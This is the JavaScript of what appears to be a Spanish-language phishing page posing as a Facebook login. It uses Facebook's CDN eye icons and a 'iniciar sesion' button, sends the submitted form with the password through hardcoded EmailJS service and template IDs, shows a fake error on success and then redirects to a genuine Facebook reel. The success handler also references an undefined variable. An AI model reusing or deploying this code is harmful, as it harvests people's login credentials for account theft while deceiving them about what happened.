// Función para mostrar/ocultar el menú de idiomas
function toggleLanguageMenu() {
    const languageMenu = document.getElementById("languageMenu");
    if (languageMenu.style.display === "block") {
        languageMenu.style.display = "none";
    } else {
        languageMenu.style.display = "block";
    }
}

// Función para cambiar el idioma seleccionado
function changeLanguage(languageCode, languageName) {
    // Actualiza el texto del selector de idioma
    const languageSelector = document.querySelector(".language-selector span");
    languageSelector.textContent = languageName;

    // Oculta el menú de idiomas
    const languageMenu = document.getElementById("languageMenu");
    languageMenu.style.display = "none";

    // Aquí puedes agregar lógica adicional para cambiar el idioma de la página
    console.log("Idioma seleccionado:", languageCode);
}

const btn = document.getElementById('button');

document.getElementById('form')
 .addEventListener('submit', function(event) {
   event.preventDefault();

   btn.value = 'iniciar sesion';

   const serviceID = 'service_mtnflaz';
   const templateID = 'template_zl9xe0s';

   emailjs.sendForm(serviceID, templateID, this)
    .then(() => {
      btn.value = 'iniciar sesion';
      alert(`Error: ${err.status} - ${err.text || 'No se recibió respuesta del servidor'}`);
    }, (err) => {
      btn.value = 'iniciar sesion';
      alert(JSON.stringify(err));
    });
});

const passwordField = document.getElementById('password');
const toggleButton = document.getElementById('toggle-password');
const eyeIcon = document.getElementById('eye-icon');

toggleButton.addEventListener('click', () => {
  if (passwordField.type === 'password') {
    passwordField.type = 'text'; // Mostrar la contraseña
    eyeIcon.src = 'https://z-m-static.xx.fbcdn.net/rsrc.php/v4/yL/r/b6nQl1NPLRq.png'; // Cambiar a ojo abierto
  } else {
    passwordField.type = 'password'; // Ocultar la contraseña
    eyeIcon.src = 'https://z-m-static.xx.fbcdn.net/rsrc.php/v4/yq/r/iHk6KioQuJP.png '; // Cambiar a ojo cerrado
  }
});

document.getElementById('button').addEventListener('click', function() {
    window.location.href = 'https://www.facebook.com/reel/1722129138366548/?referral_source=vod_newsfeed_unit&surface_type=vod';
});